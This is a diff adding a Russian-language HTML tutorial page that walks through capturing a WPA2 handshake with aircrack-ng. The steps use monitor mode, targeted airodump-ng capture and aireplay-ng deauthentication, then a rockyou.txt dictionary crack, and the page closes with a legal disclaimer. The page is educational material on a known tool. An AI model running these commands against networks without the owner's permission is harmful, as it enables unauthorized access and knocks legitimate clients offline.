@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aircrack :: Практика</title>
+    <link href="https://fonts.googleapis.com/css2?family=Audiowide&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="icon" href="images/aircrack-ng_ico.svg">
+</head>
+<body>
+    <div class="cap">
+        <div class="capper">user@arch ~❯ sudo ./break_wifi.sh</div>
+        <div class="nav">
+            <a href="index.html" class="nav-btn">[ТЕОРИЯ]</a>
+            <a href="practice.html" class="nav-btn" style="color: var(--pink);animation: soft-text-pulse 2.5s infinite ease-in-out;">[ПРАКТИКА]</a>
+            <a href="about.html" class="nav-btn">[О ПРОЕКТЕ]</a>
+            <a href="contacts.html" class="nav-btn">[КОНТАКТЫ]</a>
+        </div>
+    </div>
+
+    <main>
+        <h1>🗲 AIRCRACK В ДЕЛЕ 🗲</h1>
+        <h2>5 шагов к захвату handshake</h2>
+
+        <div class="section">
+            <p class="big">Всё делается в терминале от <span class="pink">root (или под sudo)</span>. Убедись, что Wi‑Fi адаптер поддерживает режим монитора.</p>
+        </div>
+
+        <div class="ascii-box">
+    <pre>
+ШАГ 1. Включаем монитор-режим
+user@arch ~❯ sudo airmon-ng start wlan0
+    </pre>
+    <br><p class="cmd-comment"><span class="yellow">airmon-ng start</span> — переводит интерфейс wlan0 в режим монитора (появится wlan0mon).</p>
+
+    <br><pre>
+ШАГ 2. Смотрим эфир
+user@arch ~❯ sudo airodump-ng wlan0mon
+    </pre>
+    <br><p class="cmd-comment"><span class="yellow">airodump-ng</span> — показывает все точки доступа и клиенты в радиусе действия.</p>
+
+    <br><pre>
+ШАГ 3. Фокусируемся на цели
+user@arch ~❯ sudo airodump-ng -c 6 --bssid 00:1A:2B:3C:4D:5E -w capture wlan0mon
+    </pre>
+    <br><p class="cmd-comment"><span class="yellow">-c 6</span> — канал 6, <span class="yellow">--bssid</span> — MAC точки, <span class="yellow">-w capture</span> — сохранять данные в файл capture.</p>
+
+    <br><pre>
+ШАГ 4. Деаутентификация (заставляем клиента переподключиться)
+user@arch ~❯ sudo aireplay-ng -0 2 -a 00:1A:2B:3C:4D:5E -c AA:BB:CC:DD:EE:FF wlan0mon
+    <br></pre>
+    <br><p class="cmd-comment"><span class="yellow">-0 2</span> — отправить 2 пакета деаутентификации, <span class="yellow">-a</span> — MAC точки, <span class="yellow">-c</span> — MAC клиента (если не указывать, то широковещательно).</p>
+
+    <br><pre>
+ШАГ 5. Взлом словарём
+user@arch ~❯ sudo aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
+    </pre>
+    <br><p class="cmd-comment"><span class="yellow">-w</span> — путь к словарю (rockyou.txt — классический набор паролей).</p>
+</div>
+
+        <div class="terminal-block">
+            <div class="terminal">
+                <span class="cmd">
+ user@arch ~❯ sudo airodump-ng wlan0mon</span><br>
+                <br>
+ BSSID              PWR  Beacons    #Data  #/s  CH  MB   ENC  CIPHER AUTH ESSID<br>
+ <span class="bssid">00:1A:2B:3C:4D:5E</span>  -45      123       42    0   6  54e  WPA2 CCMP   PSK  HomeNetwork<br>
+ <br>
+ BSSID              STATION            PWR  Rate  Lost  Frames  Probe<br>
+ <span class="bssid">00:1A:2B:3C:4D:5E</span>  <span class="station">AA:BB:CC:DD:EE:FF</span>  -51   1e-1e    0      2<br>
+ <br>
+ <span class="handshake">[WPA Handshake: 00:1A:2B:3C:4D:5E]</span><br>
+            </div>
+            <p class="terminal-caption">⏺ После четвёртого шага появится надпись <span class="pink">[WPA Handshake]</span> — можно брутить.</p>
+        </div>
+
+        <div class="section">
+            <h2>Полезные опции aircrack</h2>
+            <table class="cyber-table">
+                <thead>
+                    <tr><th>Команда</th><th>Описание</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>-w словарь</td><td>Указать путь к словарю</td></tr>
+                    <tr><td>-b BSSID</td><td>Атака только на конкретную точку</td></tr>
+                    <tr><td>-e ESSID</td><td>Фильтр по имени сети</td></tr>
+                    <tr><td>-p</td><td>Использовать PTW-атаку (для WEP)</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+    <div class="section">
+        <h2>🗝 Пример подбора пароля, через aircrack-ng 🗝</h2>
+
+        <div class="photo-grid">
+            <div class="photo-card">
+                <img class="photo" src="images/Aircrack-ng_dictionary_attack.png" alt="ASUS ROG Rapture GT-AXE16000">
+            <div class="photo-caption">ASUS ROG Rapture GT-AXE16000<br><span class="small">дорогой, быстрый, но не безопасный</span></div>
+        </div>
+            <div class="photo-card">
+                <img class="photo" src="images/key found.png" alt="Digma DWR-N301">
+                <div class="photo-caption">Digma DWR-N301<br><span class="small">самый дешевый роутер</span></div>
+            </div>
+        </div>
+
+        <div class="disclaimer">
+            Применение инструмента для взлома чужих сетей без разрешения владельца незаконно и может повлечь за собой административную ответственность. А за эксплуатацию уязвимостей в сети, взлом устройств и сниффинг - это уже уголовное (Статья 272,273,274) сроком до 4 лет.
+        </div>
+    </main>
+
+    <footer>
+        <div class="footer-nav">
+            <a href="index.html">ТЕОРИЯ</a>
+            <a href="practice.html">ПРАКТИКА</a>
+            <a href="about.html">О ПРОЕКТЕ</a>
+            <a href="contacts.html">КОНТАКТЫ</a>
+        </div>
+        <p>© 2026 / aircrack-handshake</p>
+    </footer>
+</body>
+</html>
